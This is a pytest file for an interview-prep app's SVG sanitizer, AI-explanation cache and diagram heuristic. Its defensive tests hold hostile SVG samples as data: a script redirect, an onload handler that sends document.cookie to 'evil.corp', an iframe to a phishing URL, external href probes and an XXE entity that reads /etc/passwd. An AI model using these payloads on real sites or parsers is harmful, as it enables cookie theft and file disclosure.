"""
Security & Reliability Verification for 'Explain with AI' SVG Diagrams.

Proves:
1. Malicious SVG payloads (containing <script>, onload/event handlers,
   <foreignObject> with HTML/iframes, external hrefs) are completely neutralized.
2. Malformed/unclosed XML degrades gracefully to None without visible error or exception.
3. Valid, safe SVGs parse and render properly with preserved shapes, paths, text.
4. AI explanation caching per question + provider/model avoids redundant AI gateway calls.
5. Question bank audit across technical tracks correctly differentiates concepts needing diagrams.
"""

import json
import pytest
from unittest.mock import patch

from src.app.scraper.sanitizer import sanitize_svg, SAFE_SVG_TAGS
from src.app.services.interview_prep import (
    interview_prep_service,
    should_question_have_diagram,
    _generate_question_svg_diagram,
)
from src.app.schemas_interview_prep import QuestionAIExplainResponse


def test_sanitize_svg_strips_script_tags():
    """Verify that executable <script> tags and embedded JS payloads are completely neutralized."""
    malicious_svg = (
        '<svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">'
        '<script type="text/javascript">alert("XSS Attack!"); window.location="https://attacker.evil";</script>'
        '<circle cx="50" cy="50" r="40" fill="#10b981" />'
        '</svg>'
    )
    cleaned = sanitize_svg(malicious_svg)
    assert cleaned is not None
    assert "<script" not in cleaned.lower()
    assert "</script>" not in cleaned.lower()
    assert "alert(" not in cleaned
    assert "attacker.evil" not in cleaned
    assert "circle" in cleaned
    assert 'fill="#10b981"' in cleaned


def test_sanitize_svg_strips_onload_and_event_handlers():
    """Verify that all on* event handler attributes (onload, onclick, onerror, etc.) are stripped."""
    payload = (
        '<svg viewBox="0 0 200 100" xmlns="http://www.w3.org/2000/svg" '
        'onload="fetch(\'https://evil.corp/steal?c=\' + document.cookie)">'
        '<rect x="10" y="10" width="80" height="40" fill="#38bdf8" '
        'onclick="alert(1)" onmouseover="eval(\'bad\')" onerror="alert(2)" />'
        '<text x="50" y="30" fill="#ffffff" onfocus="alert(3)">Service Gateway</text>'
        '</svg>'
    )
    cleaned = sanitize_svg(payload)
    assert cleaned is not None
    cleaned_lower = cleaned.lower()
    assert "onload" not in cleaned_lower
    assert "onclick" not in cleaned_lower
    assert "onmouseover" not in cleaned_lower
    assert "onerror" not in cleaned_lower
    assert "onfocus" not in cleaned_lower
    assert "fetch(" not in cleaned_lower
    assert "document.cookie" not in cleaned_lower
    assert "rect" in cleaned
    assert "Service Gateway" in cleaned


def test_sanitize_svg_decomposes_foreignobject_with_embedded_html():
    """Verify that <foreignObject> embedding arbitrary HTML, iframes, and scripts is stripped."""
    payload = (
        '<svg viewBox="0 0 300 200" xmlns="http://www.w3.org/2000/svg">'
        '<foreignObject x="20" y="20" width="160" height="160">'
        '<div xmlns="http://www.w3.org/1999/xhtml">'
        '<iframe src="https://evil.com/phishing"></iframe>'
        '<p>Malicious content <script>document.steal()</script></p>'
        '</div>'
        '</foreignObject>'
        '<path d="M 10 10 L 50 50" stroke="#f43f5e" stroke-width="2" />'
        '</svg>'
    )
    cleaned = sanitize_svg(payload)
    assert cleaned is not None
    assert "foreignobject" not in cleaned.lower()
    assert "iframe" not in cleaned.lower()
    assert "script" not in cleaned.lower()
    assert "document.steal" not in cleaned
    assert "path" in cleaned
    assert 'stroke="#f43f5e"' in cleaned


def test_sanitize_svg_neutralizes_external_resource_references():
    """Verify that external href/xlink:href pointing to remote URLs are stripped."""
    payload = (
        '<svg viewBox="0 0 200 100" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">'
        '<defs>'
        '<marker id="arrow" viewBox="0 0 10 10" refX="5" refY="5">'
        '<path d="M 0 0 L 10 5 L 0 10 z" fill="#38bdf8" />'
        '</marker>'
        '</defs>'
        '<path d="M 10 10 L 100 10" marker-end="url(#arrow)" href="https://attacker.evil/probe" '
        'xlink:href="https://attacker.evil/image.svg" />'
        '</svg>'
    )
    cleaned = sanitize_svg(payload)
    assert cleaned is not None
    assert "https://attacker.evil" not in cleaned
    assert "path" in cleaned


def test_sanitize_svg_malformed_xml_degrades_gracefully_to_none():
    """Verify that unclosed XML tags or malformed SVG markup returns None rather than raising an exception."""
    malformed_cases = [
        '<svg><rect x="10" y="10">unclosed tags and bad entities &foo;',
        '<svg viewBox="0 0 100 100"><circle cx="50" cy="50" r="40">',  # unclosed circle & svg
        'Not an SVG at all',
        '<svg><![CDATA[ some unclosed cdata',
        '<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>',  # DTD / entity attack
        "",
        None,
    ]
    for case in malformed_cases:
        result = sanitize_svg(case)
        assert result is None, f"Expected None for malformed case: {case!r}"


def test_sanitize_svg_valid_safe_svg_preserves_elements():
    """Verify that a legitimate, safe architecture diagram preserves its elements and styling."""
    safe_svg = (
        '<svg viewBox="0 0 640 200" xmlns="http://www.w3.org/2000/svg">'
        '<defs>'
        '<marker id="arrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">'
        '<path d="M 0 1 L 10 5 L 0 9 z" fill="#38bdf8" />'
        '</marker>'
        '</defs>'
        '<rect x="20" y="40" width="140" height="60" rx="8" fill="#1e293b" stroke="#38bdf8" stroke-width="2" />'
        '<text x="90" y="75" text-anchor="middle" fill="#f8fafc" font-size="12" font-weight="600">Client Gateway</text>'
        '<line x1="160" y1="70" x2="280" y2="70" stroke="#38bdf8" stroke-width="2" marker-end="url(#arrow)" />'
        '<rect x="280" y="40" width="140" height="60" rx="8" fill="#1e293b" stroke="#10b981" stroke-width="2" />'
        '<text x="350" y="75" text-anchor="middle" fill="#f8fafc" font-size="12" font-weight="600">Service Mesh</text>'
        '</svg>'
    )
    cleaned = sanitize_svg(safe_svg)
    assert cleaned is not None
    assert "viewBox" in cleaned
    assert "Client Gateway" in cleaned
    assert "Service Mesh" in cleaned
    assert "marker" in cleaned
    assert "line" in cleaned
    assert "rect" in cleaned


def test_explain_with_ai_caching_and_force_regenerate():
    """Verify that explain_with_ai caches results and reuses them unless force_regenerate=True."""
    import asyncio

    async def _test():
        # Pick first available question in domain
        tree = interview_prep_service.get_domain_tree("data_engineering")
        assert tree is not None
        assert len(tree.categories) > 0
        assert len(tree.categories[0].topics) > 0
        q_slug = tree.categories[0].topics[0].questions[0].slug

        # First call: generates and caches
        resp1 = await interview_prep_service.explain_with_ai(
            domain_id="data_engineering",
            question_slug=q_slug,
            mode="simplify",
            language="en",
            force_regenerate=False,
        )
        assert isinstance(resp1, QuestionAIExplainResponse)
        assert resp1.explanation
        assert resp1.structured_payload is not None

        # Second call without force_regenerate: should return immediately from cache
        with patch("src.app.services.ai_gateway.generate_completion") as mock_generate:
            resp2 = await interview_prep_service.explain_with_ai(
                domain_id="data_engineering",
                question_slug=q_slug,
                mode="simplify",
                language="en",
                force_regenerate=False,
            )
            assert isinstance(resp2, QuestionAIExplainResponse)
            assert resp2.explanation == resp1.explanation
            # Generator was not called because cache hit
            mock_generate.assert_not_called()

    asyncio.run(_test())


def test_question_bank_diagram_heuristic_audit():
    """
    Audit the question bank across all technical domains to ensure
    should_question_have_diagram behaves accurately and deterministically.
    """
    domains = interview_prep_service.list_domains()
    assert len(domains) >= 3

    diagram_counts = {}
    sample_audit = []

    for domain in domains:
        tree = interview_prep_service.get_domain_tree(domain.id)
        if not tree:
            continue

        domain_has_diagram = 0
        domain_no_diagram = 0

        for cat in tree.categories:
            for top in cat.topics:
                for q_summary in top.questions:
                    detail = interview_prep_service.get_question_detail(domain.id, q_summary.slug)
                    if not detail:
                        continue
                    needs_diag = should_question_have_diagram(detail)
                    if needs_diag:
                        domain_has_diagram += 1
                        # Verify fallback diagram can be generated and sanitized cleanly
                        svg = _generate_question_svg_diagram(detail)
                        clean = sanitize_svg(svg)
                        assert clean is not None, f"Failed to generate safe SVG for {detail.title}"
                    else:
                        domain_no_diagram += 1

                    if len(sample_audit) < 15:
                        sample_audit.append({
                            "domain": domain.id,
                            "category": detail.category,
                            "title": detail.title,
                            "has_diagram": needs_diag,
                        })

        diagram_counts[domain.id] = {
            "has_diagram": domain_has_diagram,
            "no_diagram": domain_no_diagram,
            "total": domain_has_diagram + domain_no_diagram,
        }

    # Verify every domain has questions correctly classified
    for d_id, counts in diagram_counts.items():
        assert counts["total"] > 0, f"Domain {d_id} has no questions"
        assert counts["has_diagram"] > 0, f"Domain {d_id} expected some questions to qualify for diagrams"

    # Spot check specific concept classifications
    # E.g., architecture, pipeline, flow, stream, batch questions should qualify
    # Pure definitional questions without flow/architecture should not
